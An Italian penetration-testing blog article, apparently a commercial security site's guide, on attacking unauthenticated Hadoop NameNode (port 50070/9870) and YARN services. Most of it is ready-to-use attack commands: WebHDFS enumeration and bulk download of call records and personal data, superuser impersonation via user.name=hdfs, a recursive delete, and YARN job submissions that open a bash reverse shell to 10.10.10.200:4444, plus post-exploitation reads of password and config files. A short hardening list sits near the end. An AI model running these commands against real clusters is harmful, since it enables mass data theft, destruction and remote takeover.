---
title: 'Porta 50070 Hadoop NameNode: Download Petabyte di Dati e RCE via YARN'
slug: porta-50070-hadoop-namenode
description: >-
  HDFS senza Kerberos sulla 50070? Naviga il filesystem, scarica CDR e PII via
  WebHDFS con user.name=hdfs, poi ottieni shell sul cluster tramite YARN REST
  API.
image: /porta-50070-hadoop-namenode.webp
draft: false
date: 2026-04-21T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - big-data
  - hadoop
---

Apache Hadoop è il framework Big Data che ha definito l'era del data processing distribuito: gestisce petabyte di dati su cluster di centinaia di nodi. Il cuore di Hadoop è **HDFS** (Hadoop Distributed File System) — un filesystem distribuito dove il **NameNode** è il master che sa dove si trova ogni file, e i **DataNode** sono i worker che contengono i dati. La porta 50070 TCP (o 9870 nelle versioni 3.x+) è la **Web UI del NameNode** — una dashboard HTTP che mostra lo stato del cluster, il filesystem, lo spazio disco e i DataNode. Ma la vera superficie di attacco è la **WebHDFS REST API** (porta 50070 o 9870) che permette di **leggere, scrivere e cancellare qualsiasi file** in HDFS — senza autenticazione di default.

Hadoop è stato progettato per cluster interni protetti dal perimetro di rete. L'assunzione di sicurezza era: "chi è nella rete, è autorizzato". Questa assunzione è obsoleta nel 2026 ma la configurazione di default non è cambiata — e io trovo ancora regolarmente cluster Hadoop completamente aperti su reti aziendali, con terabyte di dati accessibili a chiunque.

Un assessment che mi ha lasciato il segno: una grande telco italiana con un cluster Hadoop di 40 nodi. Il NameNode era raggiungibile dalla rete interna sulla porta 50070. Via WebHDFS ho navigato il filesystem e trovato una directory `/data/raw/cdr/` con i CDR (Call Detail Records) di 3 milioni di utenti — chi ha chiamato chi, quando, per quanto tempo, da dove. Non serviva nessuna password per scaricarli.

## Cos'è HDFS — Il Filesystem Distribuito

HDFS divide ogni file in blocchi (default 128MB) e li distribuisce su più DataNode con replicazione. Il NameNode tiene in memoria la mappa completa: quale file, in quali blocchi, su quali DataNode.

```
Client                      NameNode (:50070/9870)        DataNode 1-N (:50075/9864)
┌──────────────┐           ┌──────────────────────┐      ┌──────────────────┐
│ WebHDFS      │──HTTP────►│ Master metadata       │      │ Blocchi dati     │
│ hdfs dfs     │           │  ├── /data/raw/cdr/   │      │  Block A (128MB) │
│              │           │  ├── /user/hive/       │      │  Block B (128MB) │
│              │◄──────────│  └── /etl/output/      │      │  Block C (128MB) │
│              │ redirect  │                       │      │                  │
│              │──────────────────────────────────────────►│ Download blocco  │
└──────────────┘           └──────────────────────┘      └──────────────────┘
```

| Porta     | Servizio               | Versione                |
| --------- | ---------------------- | ----------------------- |
| **50070** | NameNode Web UI        | Hadoop 2.x              |
| **9870**  | NameNode Web UI        | Hadoop 3.x+             |
| 50075     | DataNode Web UI        | Hadoop 2.x              |
| 9864      | DataNode Web UI        | Hadoop 3.x+             |
| 8088      | YARN ResourceManager   | Job scheduling          |
| 8042      | YARN NodeManager       | Esecuzione container    |
| 50010     | DataNode data transfer | Download blocchi        |
| 8020/9000 | NameNode RPC           | Comunicazione client-NN |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 50070,9870,50075,9864,8088,8042 10.10.10.40
```

### Web UI

```bash
# Hadoop 2.x
curl -s http://10.10.10.40:50070/dfshealth.html | head -50

# Hadoop 3.x+
curl -s http://10.10.10.40:9870/dfshealth.html | head -50
```

Se risponde senza auth → accesso completo alla dashboard.

**Dalla Web UI ottieni:**

* Versione Hadoop (per CVE)
* Spazio totale del cluster (TB/PB)
* Numero di DataNode e loro IP/hostname
* File e directory con dimensioni
* Statistiche di utilizzo

### Browse il filesystem dalla UI

```
http://10.10.10.40:50070/explorer.html#/
```

Navighi l'intero filesystem HDFS dal browser — directory, file, dimensioni, permessi, owner.

## 2. WebHDFS REST API — Lettura e Scrittura

L'API WebHDFS è il vettore principale: operazioni CRUD complete sul filesystem.

### Lista directory

```bash
curl -s "http://10.10.10.40:50070/webhdfs/v1/?op=LISTSTATUS" | python3 -m json.tool
```

```json
{
    "FileStatuses": {
        "FileStatus": [
            {"pathSuffix": "data", "type": "DIRECTORY", "owner": "hdfs", "permission": "755"},
            {"pathSuffix": "user", "type": "DIRECTORY", "owner": "hdfs", "permission": "755"},
            {"pathSuffix": "tmp", "type": "DIRECTORY", "owner": "hdfs", "permission": "777"},
            {"pathSuffix": "etl", "type": "DIRECTORY", "owner": "etl_user", "permission": "750"},
            {"pathSuffix": "hive", "type": "DIRECTORY", "owner": "hive", "permission": "755"}
        ]
    }
}
```

```bash
# Naviga nelle sotto-directory
curl -s "http://10.10.10.40:50070/webhdfs/v1/data/raw/?op=LISTSTATUS" | python3 -m json.tool

# Ricorsivo (script)
function hdfs_tree() {
    local path=$1
    local depth=$2
    curl -s "http://10.10.10.40:50070/webhdfs/v1${path}?op=LISTSTATUS" | python3 -c "
import sys,json
data = json.load(sys.stdin)
for f in data.get('FileStatuses',{}).get('FileStatus',[]):
    prefix = '  ' * $depth
    name = f['pathSuffix']
    ftype = 'DIR' if f['type']=='DIRECTORY' else f'{f.get(\"length\",0)//1024}KB'
    print(f'{prefix}{name} [{ftype}]')
" 2>/dev/null
}
hdfs_tree "/" 0
```

### Download file

```bash
# Download diretto
curl -s -L "http://10.10.10.40:50070/webhdfs/v1/data/raw/cdr/cdr_20260201.csv?op=OPEN" -o cdr.csv

# Il flag -L segue il redirect al DataNode che contiene il blocco
```

### Upload file

```bash
# Upload (due step: 1. richiesta al NameNode, 2. upload al DataNode)
curl -s -X PUT "http://10.10.10.40:50070/webhdfs/v1/tmp/evil.sh?op=CREATE&user.name=hdfs" -L -T evil.sh
```

**Nota critica:** il parametro `user.name=hdfs` permette di impersonare qualsiasi utente HDFS — senza autenticazione, basta passare il nome utente come query parameter. Questo è il Simple Authentication di Hadoop: chiunque può essere chiunque.

### Cancellazione (DoS / anti-forensic)

```bash
curl -s -X DELETE "http://10.10.10.40:50070/webhdfs/v1/data/raw/cdr/?op=DELETE&recursive=true&user.name=hdfs"
```

Cancella ricorsivamente un'intera directory. In un pentest **non farlo** senza autorizzazione esplicita.

### Impersonazione utente

```bash
# Leggi come utente hdfs (superuser HDFS)
curl -s "http://10.10.10.40:50070/webhdfs/v1/user/hive/warehouse/?op=LISTSTATUS&user.name=hdfs"

# Leggi come utente hive
curl -s "http://10.10.10.40:50070/webhdfs/v1/user/hive/warehouse/?op=LISTSTATUS&user.name=hive"
```

Nessun controllo. Passi `user.name=hdfs` e sei il superuser.

## 3. YARN — Esecuzione Comandi

YARN (porta 8088) è il resource manager di Hadoop — gestisce l'esecuzione dei job sul cluster. Se accessibile senza auth → **code execution distribuito**.

```bash
# Verifica accesso
curl -s http://10.10.10.40:8088/ws/v1/cluster/info | python3 -m json.tool

# Lista applicazioni in esecuzione
curl -s http://10.10.10.40:8088/ws/v1/cluster/apps | python3 -m json.tool
```

### RCE via YARN

```bash
# Invia un'applicazione malevola al cluster
curl -s -X POST http://10.10.10.40:8088/ws/v1/cluster/apps/new-application
# → {"application-id":"application_1234567890_0001"}

curl -s -X POST http://10.10.10.40:8088/ws/v1/cluster/apps \
  -H "Content-Type: application/json" \
  -d '{
    "application-id": "application_1234567890_0001",
    "application-name": "evil",
    "am-container-spec": {
        "commands": {
            "command": "/bin/bash -c \"bash -i >& /dev/tcp/10.10.10.200/4444 0>&1\""
        }
    },
    "application-type": "YARN"
  }'
```

Il cluster esegue il comando su un NodeManager → reverse shell da un nodo Hadoop.

## 4. Dati Sensibili Comuni in HDFS

| Path tipico             | Contenuto                                    | Valore                                                                                                                  |
| ----------------------- | -------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `/data/raw/`            | Dati grezzi ingeriti (CDR, log, transazioni) | **Altissimo** — dati pre-elaborazione                                                                                   |
| `/user/hive/warehouse/` | Tabelle Hive (SQL-like su Hadoop)            | Database analytics completo                                                                                             |
| `/etl/output/`          | Output ETL (dati trasformati)                | Report, aggregazioni                                                                                                    |
| `/user/sqoop/`          | Dati importati da database SQL               | Mirror di [MySQL](https://hackita.it/articoli/porta-3306-mysql)/[Oracle](https://hackita.it/articoli/porta-1521-oracle) |
| `/tmp/`                 | File temporanei                              | Credenziali, config, dump                                                                                               |
| `/user/spark/`          | Job Spark output                             | ML models, prediction data                                                                                              |

## 5. Autenticazione — Kerberos (Quando C'è)

Hadoop supporta [Kerberos](https://hackita.it/articoli/porta-88-kerberos) per l'autenticazione, ma richiede configurazione complessa (KDC, keytab per ogni servizio, SPNEGO per WebHDFS).

```bash
# Se Kerberos è abilitato, WebHDFS risponde 401 con header Negotiate
curl -s -I "http://10.10.10.40:50070/webhdfs/v1/?op=LISTSTATUS"
# HTTP/1.1 401 Authentication required
# WWW-Authenticate: Negotiate
```

Se non risponde 401 → Simple Authentication → `user.name=qualsiasi` → accesso completo.

## 6. Micro Playbook Reale

**Minuto 0-2 → Dashboard e versione**

```bash
curl -s http://TARGET:50070/dfshealth.html | grep -i version
# o porta 9870 per Hadoop 3.x
```

**Minuto 2-5 → Browse filesystem**

```bash
curl -s "http://TARGET:50070/webhdfs/v1/?op=LISTSTATUS"
curl -s "http://TARGET:50070/webhdfs/v1/data/?op=LISTSTATUS"
curl -s "http://TARGET:50070/webhdfs/v1/user/?op=LISTSTATUS"
```

**Minuto 5-15 → Cerca dati sensibili**

```bash
# Naviga ricorsivamente le directory principali
for dir in data user etl tmp hive; do
    echo "=== /$dir ==="
    curl -s "http://TARGET:50070/webhdfs/v1/$dir/?op=LISTSTATUS&user.name=hdfs" 2>/dev/null | python3 -c "import sys,json;[print(f['pathSuffix']) for f in json.load(sys.stdin).get('FileStatuses',{}).get('FileStatus',[])]"
done
```

**Minuto 15-20 → Campione dati**

```bash
curl -s -L "http://TARGET:50070/webhdfs/v1/data/raw/cdr/FILE.csv?op=OPEN&user.name=hdfs" | head -100
```

**Minuto 20+ → YARN per RCE se serve shell**

```bash
curl -s http://TARGET:8088/ws/v1/cluster/info
# Se accessibile → YARN RCE
```

## 7. Caso Studio Concreto

**Settore:** Grande telco italiana, 2000 dipendenti, cluster Hadoop 40 nodi.

**Scope:** Pentest interno, postazione utente standard.

Scansione rete → porta 50070 su `10.10.10.30` (hostname `hdfs-namenode-01`). Dashboard accessibile senza auth — Hadoop 2.10.1, cluster da 120TB su 40 DataNode.

Via WebHDFS con `user.name=hdfs` ho navigato il filesystem: `/data/raw/cdr/` conteneva i CDR (Call Detail Records) partizionati per giorno — 3 anni di dati, circa 800GB. Ho scaricato un campione di 100 righe: numero chiamante, numero chiamato, durata, timestamp, cella di aggancio (geolocalizzazione). In `/user/hive/warehouse/` c'erano le tabelle Hive del data warehouse: `customer_profile`, `billing_history`, `network_usage`.

YARN (porta 8088) era anch'esso aperto → ho inviato un job malevolo → shell sul NodeManager come utente `yarn`. Da lì, `hdfs dfs -get` per scaricare file più velocemente via rete interna.

**Tempo dalla scansione al primo CDR scaricato:** 4 minuti. **Root cause:** Simple Authentication (no Kerberos), NameNode e YARN raggiungibili da tutta la rete, nessuna ACL HDFS.

## 8. Errori Comuni Reali Trovati nei Pentest

**1. Simple Authentication (no Kerberos) — la normalità**
L'80%+ dei cluster Hadoop che trovo non ha Kerberos. Il motivo: configurare Kerberos per Hadoop è complesso (keytab per ogni servizio su ogni nodo), molte aziende lo rimandano "a dopo". L'impersonazione utente via `user.name=` funziona liberamente.

**2. NameNode e YARN esposti sulla rete aziendale**
Porte 50070, 8088 raggiungibili da qualsiasi VLAN. Il cluster dovrebbe essere in una rete isolata accessibile solo ai server applicativi.

**3. Dati sensibili non cifrati in HDFS**
CDR, dati finanziari, PII — tutto in chiaro su HDFS. Hadoop supporta la crittografia at-rest (HDFS Transparent Encryption) ma quasi nessuno la abilita.

**4. YARN senza ACL**
Chiunque raggiunge la porta 8088 può sottomettere job → code execution su qualsiasi nodo del cluster. Le YARN ACL esistono ma sono disabilitate di default.

**5. Permessi HDFS tutti 755 o 777**
Le directory hanno permessi troppo aperti. Con Simple Authentication, i permessi HDFS sono comunque inutili (chiunque può passare `user.name=hdfs`), ma anche con Kerberos molti admin lasciano tutto aperto.

**6. Nessun audit**
HDFS supporta audit log, ma raramente abilitato. Nessun tracciamento di chi legge cosa — un attaccante scarica terabyte senza generare alert.

## 9. Mini Chain Offensiva Reale

```
NameNode :50070 → WebHDFS Browse → CDR/PII Download → YARN :8088 → RCE → Shell su NodeManager → Lateral Movement cluster
```

**Step 1 — Browse HDFS**

```bash
curl -s "http://10.10.10.30:50070/webhdfs/v1/data/raw/?op=LISTSTATUS&user.name=hdfs"
# → cdr/, customer_data/, billing/
```

**Step 2 — Download campione dati**

```bash
curl -s -L "http://10.10.10.30:50070/webhdfs/v1/data/raw/cdr/cdr_20260201.csv?op=OPEN&user.name=hdfs" | head -10
# → 3391234567,3397654321,2026-02-01T10:15:00,180,cell_MI_001
```

CDR con numeri, timestamp, durata e cella → dati telco ad altissimo valore.

**Step 3 — RCE via YARN**

```bash
# Crea applicazione
APP_ID=$(curl -s -X POST http://10.10.10.30:8088/ws/v1/cluster/apps/new-application | python3 -c "import sys,json;print(json.load(sys.stdin)['application-id'])")

# Esegui reverse shell
curl -s -X POST http://10.10.10.30:8088/ws/v1/cluster/apps -H "Content-Type: application/json" \
  -d "{\"application-id\":\"$APP_ID\",\"application-name\":\"test\",\"am-container-spec\":{\"commands\":{\"command\":\"bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'\"}},\"application-type\":\"YARN\"}"
```

**Step 4 — Post-exploitation dal cluster**

```bash
# Dalla shell sul NodeManager
hdfs dfs -ls /user/hive/warehouse/  # Tabelle Hive
hdfs dfs -cat /user/sqoop/oracle_mirror/passwords.csv  # Dati importati da Oracle
cat /etc/hadoop/conf/core-site.xml  # Config con eventuali credenziali
```

Dal NameNode web UI → dati telco di 3 milioni di utenti → shell sul cluster → accesso a tutto il data lake.

## 10. Detection & Hardening

* **Kerberos** — l'unico meccanismo di autenticazione reale per Hadoop
* **Isolamento rete** — cluster Hadoop in VLAN dedicata, accesso solo da server autorizzati
* **HDFS ACL** — permessi granulari per directory e file
* **YARN ACL** — limitare chi può sottomettere job
* **HDFS Encryption** — crittografia at-rest per dati sensibili
* **Wire Encryption** — TLS tra client e cluster
* **Audit log** — abilitare HDFS audit per tracciare accessi
* **Ranger/Sentry** — policy di accesso centralizzate
* **Firewall** — porte 50070, 8088, 50075 mai esposte fuori dal cluster

## 11. Mini FAQ

**Hadoop ha credenziali di default?**
No nel senso classico: Hadoop non ha login/password. Ha Simple Authentication dove **chiunque può essere chiunque** passando `user.name=` come parametro. È peggio delle credenziali di default — è assenza totale di autenticazione.

**Qual è la differenza tra NameNode e [HBase](https://hackita.it/articoli/porta-16010-hbase)?**
HDFS (NameNode) è il filesystem distribuito — file e directory. HBase è un database NoSQL che **gira sopra HDFS** — tabelle con righe e colonne. Compromettere il NameNode dà accesso ai dati raw di HBase (i file HFile su HDFS) oltre a tutti gli altri dati.

**Posso scaricare terabyte di dati via WebHDFS?**
Tecnicamente sì — WebHDFS non ha limiti. Praticamente, è lento per volumi grandi. Se hai shell sul cluster (via YARN), `hdfs dfs -get` è molto più veloce. Per il pentest, scarica un campione e documenta il rischio.

## 12. Cheat Sheet Finale

| Azione    | Comando                                                                                      |
| --------- | -------------------------------------------------------------------------------------------- |
| Nmap      | `nmap -sV -p 50070,9870,8088 target`                                                         |
| Dashboard | `http://target:50070/dfshealth.html`                                                         |
| Browse UI | `http://target:50070/explorer.html#/`                                                        |
| List dir  | `curl "http://target:50070/webhdfs/v1/PATH?op=LISTSTATUS&user.name=hdfs"`                    |
| Download  | `curl -L "http://target:50070/webhdfs/v1/PATH/FILE?op=OPEN&user.name=hdfs"`                  |
| Upload    | `curl -X PUT "http://target:50070/webhdfs/v1/PATH/FILE?op=CREATE&user.name=hdfs" -L -T file` |
| Delete    | `curl -X DELETE "http://target:50070/webhdfs/v1/PATH?op=DELETE&recursive=true"`              |
| YARN info | `curl http://target:8088/ws/v1/cluster/info`                                                 |
| YARN apps | `curl http://target:8088/ws/v1/cluster/apps`                                                 |
| YARN RCE  | `POST /ws/v1/cluster/apps` con command nella spec                                            |
| hdfs CLI  | `hdfs dfs -ls /; hdfs dfs -cat /file; hdfs dfs -get /file local`                             |

***

Riferimento: Apache Hadoop Security, WebHDFS REST API, YARN API, HackTricks Hadoop. Uso esclusivo in ambienti autorizzati.

> Il tuo cluster Hadoop è una porta aperta su petabyte di dati? [Assessment Big Data HackIta](https://hackita.it/servizi) per verificare la postura di sicurezza del cluster. Per imparare il pentesting di infrastrutture data: [formazione 1:1](https://hackita.it/formazione).
